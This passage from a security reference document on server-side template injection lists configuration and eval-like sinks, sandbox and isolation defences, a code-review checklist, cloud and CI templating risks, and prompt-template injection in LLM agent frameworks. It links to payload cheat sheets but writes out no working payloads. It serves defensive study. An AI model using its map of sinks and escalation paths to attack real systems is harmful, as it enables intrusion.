`code_review_expertise.md` §"format strings almost always have a better approach".

### 6.3 Configuration-as-template + eval-adjacent sinks

Many systems treat YAML, JSON, or properties files as templates with variable substitution.
The shared pattern: a configuration system supports variable substitution; user input
reaches a configuration value that is then re-interpreted.

- Helm `{{ .Values.foo }}`.
- Argo Workflows `{{inputs.parameters.foo}}` — issue #6441 (template rewrite via parameter).
- Tekton `$(params.foo)` — same class.
- GitHub Actions `${{ ... }}` (see `cicd_supply_chain_expertise.md`).
- CloudFormation `Fn::Sub` / `${...}`; Terraform `${var.foo}` (pre-0.12).

The `eval`-adjacent language primitives share the architectural sink shape ("string at
runtime becomes executable code") and warrant identical audit posture: JS `eval` /
`new Function` / `setTimeout(string,...)` / `vm.runInThisContext`; Python `eval` / `exec`
/ `compile`; Ruby `eval` / `instance_eval` / `class_eval` / `Object.const_get`; PHP `eval`
/ `assert(string)`; .NET `CSharpCodeProvider.CompileAssemblyFromSource`.

---

## 7. Defensive Patterns

The defensive guidance below is ordered by structural soundness, not by ease of adoption.
The first item is the only structurally sound defence; the rest are mitigations that
reduce blast radius if the first is violated.

### 7.1 Never accept user-controlled template bodies

The single most important rule. If users need to customise output:

- Expose a **constrained DSL** (variable substitution + fixed conditionals/loops), not a
  Turing-complete engine. **Liquid** is purpose-designed for this — Shopify built it to
  be safe against untrusted merchant input; the `Drop` model is an explicit allowlist
  with no introspection primitives.
- Or define a **structured-data customisation interface** (JSON schema the user fills in)
  and have application code render. User describes *what*; code controls *how*.

When you reach for "let users provide a template," recognise you are designing a
code-execution feature.

### 7.2 Allowlist variables and helpers

Build the context as an explicit `{name: value}` dict containing only what the template
needs. Do not pass `request`, `session`, `user`, `config`, `app`, or other framework-level
objects.

### 7.3 Sandboxed environment as defence-in-depth

Configure pessimistically (deny-default allowlist):

- **Jinja2:** `SandboxedEnvironment` + override `is_safe_attribute`
- **Twig:** `SecurityPolicy` with explicit allowlists of tags, filters, functions, methods
- **Velocity:** `SecureUberspector` + `runtime.references.strict=true`
- **Freemarker:** `TemplateClassResolver.ALLOWS_NOTHING_RESOLVER` or custom allowlist

See §5.5 for the synthesised posture.

### 7.4 Process isolation for high-risk rendering

When user-controlled templating is unavoidable: `seccomp-bpf` denying `execve`, `fork`,
`socket`, etc.; `unshare --net`; read-only root mount with writable `/tmp`; CPU/memory
limits; wall-clock timeout; no cloud workload identity (no IMDS reach). Output via
stdout JSON; host treats as untrusted.

### 7.5 Audit `render_template_string` and equivalents

Maintain a tracked list of all call sites of template-engine factory functions with
non-literal source arguments. Trace data flow from request sources. Treat un-reviewed
sites as candidate vulnerabilities; new introductions require security review.

### 7.6 CSP for client-side template rendering

For client-side templating, a strong CSP limits blast radius when template-source is
poisoned: `script-src 'self'` (no inline, no `unsafe-eval`); `object-src 'none'`;
Trusted Types policy with explicit factories. CSP does not prevent client-side SSTI; it
constrains post-exploitation.

### 7.7 Code review checklist

Before approving any PR that touches template-rendering code, verify:

1. Template source is a literal string or developer-controlled constant.
2. Otherwise, trace template-source origin to request/file/database source.
3. Engine is in sandbox mode, configured allowlist-style (deny-by-default).
4. Variable context is a minimal explicit dict — not framework-level objects (`request`,
   `session`, `config`, `app`).
5. Java: expression context is `SimpleEvaluationContext`, not `StandardEvaluationContext`.
6. Ruby: no `send(user_input)` / `public_send(user_input)` dispatch.
7. YAML/JSON/Helm configs: user values do not reach `{{...}}` / `${{...}}` contexts.
8. Template-rendering errors do not leak template source / class hierarchy in logs.
9. LLM prompt templates do not use `jinja2` format from untrusted sources.
10. Timeouts and resource limits configured; rendering process isolated from sensitive
    credentials.
11. Velocity / SpEL / OGNL: every annotation parameter audited (`@Value`, `@PreAuthorize`,
    `@PostAuthorize`).
12. Engine version current against the security-advisory feed.

### 7.8 Don't rely on engine-version-implied sandbox state

A particularly subtle anti-pattern: `if engine_version >= 3.1.5: # safe`. Sandbox-escape
CVEs are routinely re-discovered against patched versions. The structural defences in 7.1
through 7.4 are version-independent; the patch-cadence defence is version-bound. Layer
both.

---

## 8. SSTI in Serverless / Cloud-Native Contexts

The template-injection class transfers cleanly into the cloud-native ecosystem, with
several engine-equivalents that the classic SSTI literature underweights.

### 8.1 Lambda / Cloud Functions templating user input

Pattern: a Lambda function accepts an event with a user-controlled `template` field, then
renders against it. Reach: full Lambda execution role privileges via SSTI to OS execution
to AWS metadata service. The Lambda role's IAM policy is the blast-radius boundary
(see `container_k8s_security.md` §"workload identity"). Structural defence: never accept
a `template` field; define a structured `format` field with discrete enumerable values.

### 8.2 IaC / Workflow / CI templating

- **CloudFormation `Fn::Sub`:** secondary `${...}` substitution can reach unintended
  resources / parameters; more commonly privilege-escalation than RCE.
- **Terraform `${var.foo}`:** pre-0.12 string-interpolation was the language; 0.12+ HCL2
  is more constrained. `templatefile()` and `template_file` data source remain sinks.
- **Helm `{{ .Values.foo }}`:** user-supplied `--set` values + `{{ .Values.x | toYaml }}`
  rendering can inject YAML keys.
- **Argo Workflows `{{inputs.parameters.foo}}`:** parameter values containing `{{...}}`
  may re-evaluate, rewriting workflow definition fields. Issue #6441 class. Defence:
  validate that workflow parameter values do not contain `{{` / `}}`, or use
  base64-encoded parameter values for any field that could re-substitute.
- **Tekton `$(params.foo)`:** same pattern; Tekton docs state that variable contents
  are not escaped, so task authors must escape values for the shell or language they
  are used in.
- **GitHub Actions `${{ github.event.pull_request.title }}`** substituted into shell `run`
  is OS command injection. Defence: pass via `env:` to step environment; reference
  `$VAR` in shell. See `cicd_supply_chain_expertise.md` §"GHA expression injection."

### 8.3 The "configuration templating" rule

When an application reads a config file and performs `{{...}}` / `${...}` substitution,
the config file is a template; whoever can write to the config file is the template
author. Examples: Spring Boot `${env.VAR}`, K8s ConfigMap values consumed by `${...}`-aware
applications, Ansible `{{ var }}` Jinja2 evaluation.

---

## 9. AI-Context Template Injection

The transition from "classic SSTI" to "prompt-template injection" deserves explicit
treatment because the surface is rapidly growing and the literature has not consolidated.

### 9.1 Prompt-template engines as injection sinks

LangChain, LlamaIndex, anthropic-sdk message templating, and OpenAI chat templating all
implement prompt-template engines (f-strings, Jinja2, or custom DSLs). The LangChain
`PromptTemplate` advisory (GHSA-6qv9-48xg-fc7f) is the canonical case: when users control
the **template string** (not just the variables), the engine exposes attribute access and
indexing that, depending on objects in scope, can reach Python internals. Recommended
posture: use `template_format='f-string'` (narrower attribute reach than Jinja2 in
LangChain's wrapper); never accept Jinja2 templates from untrusted sources; LangChain
0.0.329+ renders Jinja2 via `SandboxedEnvironment` but LangChain's docs describe the
sandbox as a best-effort approach rather than a guarantee of security.

### 9.2 The bridge between SSTI and prompt injection

When a prompt template accepts user input, two injection classes operate simultaneously:
**template injection** at the rendering layer (full Python primitives via Jinja2
attribute traversal if the template body itself is user-controlled), and **prompt
injection** at the LLM-consumption layer (even cleanly-rendered output may contain
attacker instructions). Classic SSTI gives server-side code execution; prompt injection
gives LLM-tool-call control. In an agent system both reach the same blast-radius
boundary (the agent's tool inventory). See `llm_agent_security_expertise.md` for
the prompt-injection treatment.

### 9.3 Tool-call argument and context-window rendering

Agent frameworks frequently render tool-call arguments or context windows via template
engines before dispatch. When the LLM outputs a tool-call argument containing
template-engine syntax that the framework re-renders, the bug class manifests as
"LLM-driven SSTI." Similarly, context-window assembly via
`{{previous_messages}}{{system_prompt}}{{user_input}}` reads attacker-influenced
persistence-layer content on every turn — structurally identical to stored XSS.

Defence: render tool-call arguments and context windows via static format strings only;
never use Jinja2 / engine templating on LLM output or persistence-layer content. String
concatenation with no substitution semantics is correct here.

---

## 10. Variant Analysis — Under-Explored Surfaces

The classic SSTI literature focuses on web-application template engines. Several
adjacent surfaces share the architectural pattern but receive less attention and warrant
explicit auditing.

### 10.1 Mail / notification templating

SaaS products commonly let customers define email templates (Mandrill, SendGrid, SES
templates, Customer.io, Klaviyo) or notification payloads (Slack, Discord webhooks, Teams
adaptive cards). The architectural sink: customer A controls the template body and
variables; the provider's renderer executes and dispatches. Multi-tenant risk: when one
customer's template can reach *another customer's data* through shared renderer context,
the bug is cross-tenant template injection. Liquid `Drop` provides structural protection
where used; Handlebars requires per-customer-scoped context with no shared globals.

### 10.3 Build / IDE / documentation systems

- **Build systems:** CMake `configure_file(... @ONLY)`, Bazel `ctx.actions.expand_template`,
  GNU Make `$(eval ...)`, Ninja `${var}`. The `eval`-bearing constructs are the
  high-risk sinks; pure substitution is lower risk unless wrapped by a generator that
  lacks escape.
- **IDE extensions:** VS Code snippets, JetBrains live templates, Cursor / Windsurf rules
  files. When snippet sources are shared (extension marketplaces, org-published rule
  packs, AI-generated suggestions), the template body reaches the developer's IDE
  process with full filesystem privileges. Cross-link
  `cicd_supply_chain_expertise.md` §"developer-environment supply chain."
- **Documentation builders:** Sphinx (`conf.py` is Python; `:py:func:` evaluates), MkDocs
  (Jinja2 with `mkdocs-macros-plugin`), Hugo (Go templates + shortcodes), Jekyll (Liquid
  + plugins), Docusaurus / Next.js MDX (JSX + Markdown — full React). When pages can be
  contributed by external authors, templating constructs execute at build time. Defence:
  build in ephemeral containers with no network and read-only source mounts.

### 10.4 Database / policy / logging templating

- **Database query templates:** Doctrine DQL, Hibernate HQL, Spring Data `@Query` with
  SpEL substitution (`?#{...}`) is a direct SpEL injection sink. Cross-link
  `code_review_expertise.md` §"format strings."
- **Policy DSLs:** OPA Rego, AWS IAM Condition, CEL (K8s admission), HashiCorp Sentinel,
  Cedar. CEL is designed to be safe but the per-application function set determines reach;
  K8s admission CEL gets full request/object schema access. When SaaS products let
  customers author policies that the engine evaluates, customer reach equals engine reach.
- **Logging-format injection:** Log4Shell is the canonical case.

Log4Shell (CVE-2021-44228) is the canonical example: Log4j's `${jndi:...}` substitution
in log messages evaluated against attacker-controlled log inputs reached JNDI lookup,
which reached classloader-driven RCE. The lesson generalises: **any logging library that
performs substitution on log messages is potentially a SSTI-class sink** when log
messages contain user input.

Cross-link `deserialization_expertise.md` §"JNDI as gadget primitive" — the JNDI piece
is the deserialization angle; the `${...}` piece is the template-injection angle.
Together they produce the Log4Shell class.

---

## 11. References

### Foundational research

- Kettle, "Server-Side Template Injection: RCE for the Modern Web App," Black Hat USA 2015:
  <https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf>
- PortSwigger Research: <https://portswigger.net/research/server-side-template-injection>
- Kettle portfolio: <https://jameskettle.com/>
- Skeleton Scribe (Kettle): <https://www.skeletonscribe.net/2015/08/server-side-template-injection.html>

### Hackmanit / Hildebrand corpus

- Template Injection Table: <https://cheatsheet.hackmanit.de/template-injection-table/>
- TInjA: <https://github.com/Hackmanit/TInjA>
- Playground: <https://github.com/Hackmanit/template-injection-playground>

### Per-engine security docs

- Jinja2 Sandbox: <https://jinja.palletsprojects.com/en/stable/sandbox/>
- Twig Security: <https://twig.symfony.com/doc/3.x/api.html#sandbox-extension>
- Velocity SecureUberspector: <https://velocity.apache.org/engine/2.3/apidocs/org/apache/velocity/util/introspection/SecureUberspector.html>
- Freemarker: <https://freemarker.apache.org/docs/app_faq.html#faq_template_uploading_security>

### Kurt Boberg CVEs

- **CVE-2022-33140** Apache NiFi Registry command injection:
  <https://github.com/advisories/GHSA-77hf-23pq-2g7c>
  · <https://seclists.org/oss-sec/2022/q2/198>
- **CVE-2019-16676** simple_form: <https://github.com/advisories/GHSA-r74q-gxcg-73hx>
  · <https://blog.plataformatec.com.br/2019/09/incorrect-access-control-in-simple-form-cve-2019-16676/>
  · <https://bitcrowd.dev/simple-form-vulnerability-cve-2019-16676/>

### Working references

- OWASP WSTG SSTI: <https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection>
- PayloadsAllTheThings: <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection>
- EdOverflow cheatsheet: <https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/template-injection.md>
- HackTricks: <https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection>

### Engine-specific deep-dives

- Snyk Thymeleaf (Brian Vermeer): <https://snyk.io/blog/thymeleaf-injection/>
- Snyk Go templates: <https://snyk.io/articles/understanding-server-side-template-injection-in-golang/>
- Spring View Manipulation: <https://0xn3va.gitbook.io/cheat-sheets/framework/spring/view-manipulation>
- Veracode: <https://www.veracode.com/blog/secure-development/spring-view-manipulation-vulnerability/>
- Check Point 2024: <https://research.checkpoint.com/2024/server-side-template-injection-transforming-web-applications-from-assets-to-liabilities/>
- YesWeHack advanced exploitation: <https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation>
- GoSecure workshop: <https://gosecure.github.io/template-injection-workshop/>

### Java EL injection (Struts2 / OGNL / SpEL)

- Struts2 CVE-2017-5638: <https://nvd.nist.gov/vuln/detail/CVE-2017-5638>
- Black Duck deep-dive: <https://www.blackduck.com/blog/cve-2017-5638-apache-struts-vulnerability-explained.html>

### Jinja2 sandbox CVE corpus

- CVE-2019-10906: <https://github.com/advisories/GHSA-462w-v97r-4m45>
- CVE-2025-27516: <https://github.com/advisories/GHSA-cpwx-vrp4-4pq7>
- "Breaking jinja sandbox": <https://gist.github.com/tailhook/e60f5b656dfb5a32e2f6>

### AI / IaC / workflow

- LangChain GHSA-6qv9-48xg-fc7f: <https://github.com/langchain-ai/langchain/security/advisories/GHSA-6qv9-48xg-fc7f>
- LangChain template-format docs: <https://docs.langchain.com/langsmith/prompt-template-format>
- Argo Workflows #6441: <https://github.com/argoproj/argo-workflows/issues/6441>
- NiFi EL guide: <https://nifi.apache.org/docs/nifi-docs/html/expression-language-guide.html>

### Cross-references in this corpus

`deserialization_expertise.md` (POP, JNDI gadgets); `code_review_expertise.md`
(click-count severity, format-string heuristics, path handling); the [Semgrep rule-writing docs](https://semgrep.dev/docs/writing-rules/overview)
(rule authoring for §6 sinks); `cicd_supply_chain_expertise.md` (GHA expressions,
Argo/Tekton, build systems); `llm_agent_security_expertise.md` (prompt injection, tool-call
rendering); `xml_parser_differential_expertise.md` (XSLT, XQuery); `shell_injection_expertise.md`
(NiFi-style OS delivery); `prototype_pollution_expertise.md` (client-side template gadgets);
`ssrf_url_parsing_expertise.md` (engine HTTP-helper reach).

---

## Closing principles

1. **Templates are programs disguised as data.** Treat with the security posture of `eval()`.
2. **The architectural error is letting user input cross from the variable-context side to
   the template-body side.** Every defence is downstream of that boundary.
3. **Sandboxes are denylists in disguise; denylists are permanently broken.** Sandbox as
   defence-in-depth; architectural separation as primary defence.
4. **Expression-language injection is the genus; SSTI is one species.** SpEL, OGNL, MVEL,
   JEXL, policy DSLs, and prompt templates share the architectural pattern.
5. **Format strings are template engines in disguise.** Audit `printf`, `String.format`,
   `f"..."`, `str.format` with the same posture as `render_template_string`.
6. **Patch cadence is unbounded.** Every major template engine accumulates new
   sandbox-escape CVEs steadily; engineering posture cannot depend on the engine being
   current.
7. **When in doubt, render in a separate process with no network and read-only filesystem.**
   Process isolation is structural defence; engine sandbox is tactical.
